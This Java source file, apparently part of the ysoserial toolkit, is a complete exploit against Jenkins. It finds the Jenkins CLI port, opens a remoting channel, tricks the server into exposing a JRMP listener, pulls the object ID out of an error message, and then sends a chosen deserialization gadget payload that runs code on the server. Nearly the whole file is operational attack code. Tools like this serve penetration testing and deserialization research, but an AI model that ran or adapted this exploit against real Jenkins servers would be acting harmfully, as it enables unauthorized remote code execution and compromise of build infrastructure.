package ysoserial;


import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLConnection;
import java.rmi.activation.ActivationDesc;
import java.rmi.activation.ActivationID;
import java.rmi.activation.ActivationInstantiator;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;

import javax.net.SocketFactory;

import hudson.remoting.Callable;
import hudson.remoting.Channel;
import hudson.remoting.Channel.Mode;
import hudson.remoting.ChannelBuilder;
import hudson.remoting.JarLoader;
import sun.rmi.server.Util;
import sun.rmi.transport.TransportConstants;
import ysoserial.payloads.JRMPListener;
import ysoserial.payloads.ObjectPayload;


/**
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "javadoc", "nls", "rawtypes", "restriction"
} )
public class Jenkins {

    public static final void main ( final String[] args ) {

        if ( args.length < 3 ) {
            System.err.println(Jenkins.class.getName() + " <jenkins_url> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        final Class<? extends ObjectPayload> payloadClass = getPayloadClass(args[ 1 ]);
        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
            System.err.println("Invalid payload type '" + args[ 1 ] + "'");
            System.exit(-1);
        }

        String jenkinsUrl = args[ 0 ];
        int jrmpPort = 12345;

        Channel c = null;
        try {
            InetSocketAddress isa = getCliPort(jenkinsUrl);
            c = openChannel(isa);

            Class<?> reqClass = Class.forName("hudson.remoting.RemoteInvocationHandler$RPCRequest");

            Constructor<?> reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
            reqCons.setAccessible(true);

            Object getJarLoader = reqCons
                    .newInstance(1, Class.forName("hudson.remoting.IChannel").getMethod("getProperty", Object.class), new Object[] {
                        JarLoader.class.getName() + ".ours"
            });

            Object call = c.call((Callable<?, ?>) getJarLoader);
            InvocationHandler remote = Proxy.getInvocationHandler(call);
            Class<?> rih = Class.forName("hudson.remoting.RemoteInvocationHandler"); //$NON-NLS-1$
            Field oidF = rih.getDeclaredField("oid");
            oidF.setAccessible(true);
            int oid = oidF.getInt(remote);

            System.err.println("* JarLoader oid is " + oid);

            Object uro = new JRMPListener().getObject(String.valueOf(jrmpPort));

            Object o = reqCons
                    .newInstance(oid, JarLoader.class.getMethod("isPresentOnRemote", Class.forName("hudson.remoting.Checksum")), new Object[] {
                        uro,
            });

            try {
                c.call((Callable<?, ?>) o);
            }
            catch ( Exception e ) {
                // [ActivationGroupImpl[UnicastServerRef [liveRef:
                // [endpoint:[172.16.20.11:12345](local),objID:[de39d9c:15269e6d8bf:-7fc1,
                // -9046794842107247609]]

                System.err.println(e.getMessage());

                parseObjIdAndExploit(args, payloadClass, jrmpPort, isa, e);
            }

        }
        catch ( Throwable e ) {
            e.printStackTrace();
        }
        finally {
            if ( c != null ) {
                try {
                    c.close();
                }
                catch ( IOException e ) {
                    e.printStackTrace(System.err);
                }
            }
        }

    }


    /**
     * @param jenkinsUrl
     * @return
     * @throws MalformedURLException
     * @throws IOException
     */
    public static InetSocketAddress getCliPort ( String jenkinsUrl ) throws MalformedURLException, IOException {
        URL u = new URL(jenkinsUrl);

        URLConnection conn = u.openConnection();
        if ( ! ( conn instanceof HttpURLConnection ) ) {
            System.err.println("Not a HTTP URL"); //$NON-NLS-1$
            System.exit(-1);
        }

        HttpURLConnection hc = (HttpURLConnection) conn;
        if ( hc.getResponseCode() >= 400 ) {
            System.err.println("* Error connection to jenkins HTTP " + u);
        }
        int clip = Integer.parseInt(hc.getHeaderField("X-Jenkins-CLI-Port")); //$NON-NLS-1$

        InetSocketAddress isa = new InetSocketAddress(u.getHost(), clip);
        return isa;
    }


    /**
     * @param isa
     * @return
     * @throws IOException
     * @throws SocketException
     */
    @SuppressWarnings ( "resource" )
    public static Channel openChannel ( InetSocketAddress isa ) throws IOException, SocketException {
        System.err.println("* Opening socket " + isa);
        Socket s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
        s.setKeepAlive(true);
        s.setTcpNoDelay(true);

        System.err.println("* Opening channel");
        OutputStream outputStream = s.getOutputStream();
        DataOutputStream dos = new DataOutputStream(outputStream);
        dos.writeUTF("Protocol:CLI-connect");
        ExecutorService cp = Executors.newCachedThreadPool(new ThreadFactory() {

            public Thread newThread ( Runnable r ) {
                Thread t = new Thread(r, "Channel");
                t.setDaemon(true);
                return t;
            }
        });
        Channel c = new ChannelBuilder("EXPLOIT", cp).withMode(Mode.BINARY).build(s.getInputStream(), outputStream);
        System.err.println("* Channel open");
        return c;
    }


    /**
     * @param args
     * @param payloadClass
     * @param jrmpPort
     * @param isa
     * @param e
     * @throws Exception
     * @throws IOException
     */
    private static void parseObjIdAndExploit ( final String[] args, final Class<? extends ObjectPayload> payloadClass, int jrmpPort,
            InetSocketAddress isa, Exception e ) throws Exception, IOException {
        String msg = e.getMessage();
        int start = msg.indexOf("objID:["); //$NON-NLS-1$
        if ( start < 0 ) {
            throw new Exception("Failed to get object id");
        }

        int sep = msg.indexOf(", ", start + 1);

        if ( sep < 0 ) {
            throw new Exception("Failed to get object id, separator");
        }

        int end = msg.indexOf("]", sep + 1);

        if ( end < 0 ) {
            throw new Exception("Failed to get object id, separator");
        }

        String uid = msg.substring(start + 7, sep);
        String objNum = msg.substring(sep + 2, end);

        System.err.println("* UID is " + uid);
        System.err.println("* ObjNum is " + objNum);

        String[] parts = uid.split(":");

        long obj = Long.parseLong(objNum);
        int o1 = Integer.parseInt(parts[ 0 ], 16);
        long o2 = Long.parseLong(parts[ 1 ], 16);
        short o3 = Short.parseShort(parts[ 2 ], 16);

        exploit(new InetSocketAddress(isa.getAddress(), jrmpPort), obj, o1, o2, o3, payloadClass, args[ 2 ]);
    }


    /**
     * @param inetSocketAddress
     * @param obj
     * @param o1
     * @param o2
     * @param o3
     * @throws IOException
     */
    private static void exploit ( InetSocketAddress isa, long obj, int o1, long o2, short o3, Class<?> payloadClass, String payloadArg )
            throws IOException {
        Socket s = null;
        DataOutputStream dos = null;
        try {
            System.err.println("* Opening JRMP socket " + isa);
            s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();

            dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            final ObjectOutputStream objOut = new ObjectOutputStream(dos) {

                @Override
                protected void annotateClass ( Class<?> cl ) throws IOException {
                    if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                        writeObject(null);
                    }
                    else {
                        URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                        String cb = "";
                        for ( URL u : us ) {
                            cb += u.toString();
                        }
                        writeObject(cb);
                    }
                }


                /**
                 * Serializes a location from which to load the specified class.
                 */
                @Override
                protected void annotateProxyClass ( Class<?> cl ) throws IOException {
                    annotateClass(cl);
                }
            };

            objOut.writeLong(obj);
            objOut.writeInt(o1);
            objOut.writeLong(o2);
            objOut.writeShort(o3);

            objOut.writeInt(-1);
            objOut.writeLong(Util.computeMethodHash(ActivationInstantiator.class.getMethod("newInstance", ActivationID.class, ActivationDesc.class)));

            final ObjectPayload payload = (ObjectPayload) payloadClass.newInstance();
            final Object object = payload.getObject(payloadArg);
            objOut.writeObject(object);

            os.flush();
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
        finally {
            if ( dos != null ) {
                dos.close();
            }
            if ( s != null ) {
                s.close();
            }
        }
    }


    @SuppressWarnings ( "unchecked" )
    public static Class<? extends ObjectPayload> getPayloadClass ( final String className ) {
        try {
            return (Class<? extends ObjectPayload>) Class.forName(className);
        }
        catch ( Exception e1 ) {}
        try {
            return (Class<? extends ObjectPayload>) Class.forName(GeneratePayload.class.getPackage().getName() + ".payloads." + className);
        }
        catch ( Exception e2 ) {}
        return null;
    }
}
